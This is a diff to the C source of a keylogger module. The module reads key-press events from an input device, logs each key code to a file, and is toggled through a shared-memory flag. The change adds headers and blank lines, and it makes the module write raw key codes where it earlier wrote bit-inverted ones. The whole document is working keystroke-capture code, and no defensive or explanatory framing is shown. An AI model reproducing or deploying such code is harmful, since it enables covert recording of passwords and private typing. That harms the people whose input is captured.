@@ -5,6 +5,8 @@
 #include <sys/stat.h>
 #include <sys/mman.h>
 #include <fcntl.h>
+#include <errno.h>
+#include <string.h>
 
 #include "keylogger.h"
 #include "../include/types.h"
@@ -25,6 +27,7 @@ void keylogger_allow()
 	if (fd_shm == -1)
 	{
 		DEBUG_PRINT((P_ERROR " [keylogger_allow] Error opening the shared memory segment\n"));
+
 		return;
 	}
 
@@ -34,6 +37,7 @@ void keylogger_allow()
 	if (aux == MAP_FAILED)
 	{
 		DEBUG_PRINT((P_ERROR " [keylogger_allow] Error mapping the shared memory segment\n"));
+
 		return;
 	}
 	if (aux->keylogger_capture == 0)
@@ -52,6 +56,7 @@ void keylogger_deny()
 	if (fd_shm == -1)
 	{
 		DEBUG_PRINT((P_ERROR " [keylogger_deny] Error opening the shared memory segment\n"));
+
 		return;
 	}
 
@@ -61,6 +66,7 @@ void keylogger_deny()
 	if (aux == MAP_FAILED)
 	{
 		DEBUG_PRINT((P_ERROR " [keylogger_deny] Error mapping the shared memory segment\n"));
+
 		return;
 	}
 	if (aux->keylogger_capture == 1)
@@ -79,6 +85,7 @@ void keylogger_end()
 	if (fd_shm == -1)
 	{
 		DEBUG_PRINT((P_ERROR " [keylogger_end] Error opening the shared memory segment\n"));
+
 		return;
 	}
 
@@ -88,6 +95,7 @@ void keylogger_end()
 	if (aux == MAP_FAILED)
 	{
 		DEBUG_PRINT((P_ERROR " [keylogger_finish] Error mapping the shared memory segment\n"));
+
 		return;
 	}
 	aux->keylogger_finish = 1;
@@ -116,6 +124,7 @@ int keylogger_init()
 	if (fd_shm == -1)
 	{
 		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error creating the shared memory\n"));
+
 		return ERROR;
 	}
 
@@ -125,6 +134,7 @@ int keylogger_init()
 	if (error == -1)
 	{
 		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error resizing the shared memory segment\n"));
+
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
 	}
@@ -135,6 +145,7 @@ int keylogger_init()
 	if (shared_memory == MAP_FAILED)
 	{
 		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error mapping the shared memory segment\n"));
+
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
 	}
@@ -147,6 +158,7 @@ int keylogger_init()
 	if ((keybrdToCapture = open(path, O_RDONLY)) == -1)
 	{
 		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error opening device\n"));
+
 		munmap(shared_memory, sizeof(*shared_memory));
 		shm_unlink(SHM_KEYLOGGER);
 		return ERROR;
@@ -171,6 +183,7 @@ int keylogger_init()
 				if (!file)
 				{
 					DEBUG_PRINT((P_ERROR " [KEYLOGGER] No file?\n"));
+
 					munmap(shared_memory, sizeof(*shared_memory));
 					shm_unlink(SHM_KEYLOGGER);
 					return ERROR;
@@ -178,7 +191,7 @@ int keylogger_init()
 
 				if (EV_KEY == ev[i].type && ev[i].value == 1)
 				{
-					fputc(~ev[i].code, file);
+					fputc(ev[i].code, file);
 				}
 
 				fclose(file);
